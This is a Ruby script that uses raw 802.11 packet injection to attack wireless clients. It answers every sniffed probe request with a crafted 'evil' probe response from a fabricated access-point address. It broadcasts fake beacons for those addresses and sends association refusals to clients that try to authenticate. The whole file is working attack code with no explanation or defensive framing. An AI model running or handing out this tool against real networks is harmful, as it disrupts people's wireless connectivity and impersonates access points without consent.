#!/usr/bin/ruby

require 'packetset'
require 'Lorcon'
require 'specialized/dot11'
require 'baflle-recv'

trap "INT" do
  puts "exiting"
  puts "clients"
  p $clients
  puts "auth_counts"
  p $auth_counts
  puts "deauth_counts"
  p $deauth_counts
  exit
end

$ap = "ba:aa:ad:f0:00:0d"

$evil_probe_response = Dot11.new(
                        :subtype =>   0x5,
                        :type =>      0x0,
                        :version =>   0x0,
                        :flags =>     0x0,
                        :duration =>  0x013a,
                        :addr1 =>     0,
                        :addr2 =>     0,
                        :addr3 =>     0,
                        :sc =>        0x0000) /
                        Dot11ProbeResp.new(:timestamp => 0, :beacon_interval => 0x0064, :capabilities => 0x0100) /
                          Dot11Elt.new(
                            :id =>            0x00,
                            :info_length =>   4,
                            :info =>          "baad") /
                          Dot11Elt.new(
                            :id =>            0x01,
                            :info_length =>   0x04,
                            :info =>          [0x82, 0x84, 0x0b, 0x16].pack("c*")) /
                          Dot11Elt.new(
                            :id =>            0x03,
                            :info_length =>   0x01,
                            :info =>          [0x0b].pack("c*"))

$beacon = Dot11.new(:type     => 0x0,
                    :subtype  => 0x8,
                    :version  => 0x0,
                    :flags    => 0x0,
                    :duration => 0x0,
                    :addr1    => "ff:ff:ff:ff:ff:ff",
                    :addr2    => "ba:aa:ad:f0:00:0d",
                    :addr3    => "ba:aa:ad:f0:00:0d",
                    :sc       => 0x0000) /
          Dot11ProbeResp.new(:timestamp => 0, :beacon_interval => 0x0064, :capabilities => 0x0100) /
          Dot11Elt.new(
            :id =>            0x00,
            :info_length =>   4,
            :info =>          "baad") /
          Dot11Elt.new(
            :id =>            0x01,
            :info_length =>   0x04,
            :info =>          [0x82, 0x84, 0x0b, 0x16].pack("c*")) /
          Dot11Elt.new(
            :id =>            0x03,
            :info_length =>   0x01,
            :info =>          [0x0b].pack("c*"))

$go_away = Dot11.new(
             :subtype =>  0x1,
             :type =>     0x0,
             :version =>  0x0,
             :flags =>    0x0,
             :duration => 0x0,
             :addr1 =>    0x0,
             :addr2 =>    0x0,
             :addr3 =>    0x0,
             :sc =>       0x0) /
             Dot11AssoResp.new(:capabilities => 0x0401, :status => 12, :aid => 0)

$clients = {}
$auth_counts = Hash.new(0)
$deauth_counts = Hash.new(0)

def generate_address(parameter)
  MACAddress.new(0xbaaaad000000 | (parameter & 0xffffff))
end

def emit(packet)
  @device.write(packet, 1, 0)
end

@device = Lorcon::Device.new("ath0", "madwifing", 1)

  #else
  #  if packet.addr1[0] != 0xff && $clients[packet.addr2] == packet.addr1
  #    if packet.subtype == 11
  #      $go_away.addr1 = packet.addr2
  #      $go_away.addr2 = packet.addr1
  #      $go_away.addr3 = packet.addr1
  #      
  #      emit $go_away.data
  #    end
  #  end
  #end

Thread.new do
  sniff :device => 'ath0', :filter => 'wlan[0] == 0xb0' do |packet|
    next unless $clients[packet.addr2] == packet.addr1
    
    $go_away.addr1 = packet.addr2
    $go_away.addr2 = packet.addr1
    $go_away.addr3 = packet.addr1

    emit $go_away.data
    
    puts "telling #{packet.addr2} to go away with #{packet.addr1}!"
  end
end

Thread.new do
  while true
    $clients.each do |blah, ap_address|
      $beacon.addr2 = ap_address
      $beacon.addr3 = ap_address
      emit $beacon.data
    end
    sleep 1
  end
end

sniff :device => 'ath0', :filter => 'wlan[0] == 0x40' do |packet|
    ap_address = $clients[packet.addr2] || generate_address($clients.size)

    $evil_probe_response.addr1 = packet.addr2
    $evil_probe_response.addr2 = ap_address
    $evil_probe_response.addr3 = ap_address
    $evil_probe_response.payload.timestamp = (Time.now.to_f * 100).to_i
    
    emit $evil_probe_response.data
    
    puts "responding to probe request from #{packet.addr2} with #{ap_address}!"
    $clients[packet.addr2] = ap_address
end
